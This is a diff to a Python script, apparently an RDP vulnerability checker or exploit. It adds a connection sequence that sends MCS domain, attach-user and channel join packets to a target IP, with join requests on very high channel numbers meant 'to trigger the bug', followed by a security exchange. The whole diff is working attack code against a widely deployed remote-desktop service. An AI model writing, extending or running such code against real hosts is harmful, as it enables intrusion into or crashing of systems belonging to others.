@@ -28,7 +28,42 @@ def rdp_session(ip):
     info(
         "<-- received {} bytes from host: {}".format(hex(len(server_data)), ip))
 
-    return ServerResponseParser(server_data)
+    server_response1 = ServerResponseParser(server_data)
+
+
+    # erect domain and attach user to domain
+    info("sending Client MCS Domain Request PDU packet -->")
+    tls.sendall(DoPduConnectionSequence().domain_request_pdu())
+    info("sending Client MCS Attach User PDU request packet -->")
+    tls.sendall(DoPduConnectionSequence(
+    ).mcs_attach_user_request_pdu())
+    returned_packet = tls.recv(8000)
+    info(
+        "<-- received {} bytes from host: {}".format(hex(len(returned_packet)), ip))
+
+    # send join requests on ridiculously high channel numbers to trigger the bug
+    info("sending MCS Channel Join Request PDU packets -->")
+
+    pdus = DoPduConnectionSequence().do_join_request()
+    for pdu in pdus:
+        tls.sendall(pdu)
+        channel_number = int(Packer(pdu).bin_pack()[-4:], 16)
+        returned_packet = tls.recv(1024)
+        info("<-- received {} bytes from channel {} on host: {}".format(
+            hex(len(returned_packet)), channel_number, ip
+        ))
+
+    # my personal favorite is the security exchange, took me awhile to figure this one out
+    info("sending Client Security Exhcange PDU packets -->")
+    tls.sendall(DoPduConnectionSequence(
+    ).do_client_security_pdu_exchange())
+    tls.sendall(DoPduConnectionSequence().client_info_pdu())
+    returned_packet = tls.recv(8000)
+    info("<-- received {} bytes from host: {}".format(
+        hex(len(returned_packet)), ip
+    ))
+    server_error = returned_packet
+    return server_response1
 
 
 def main():
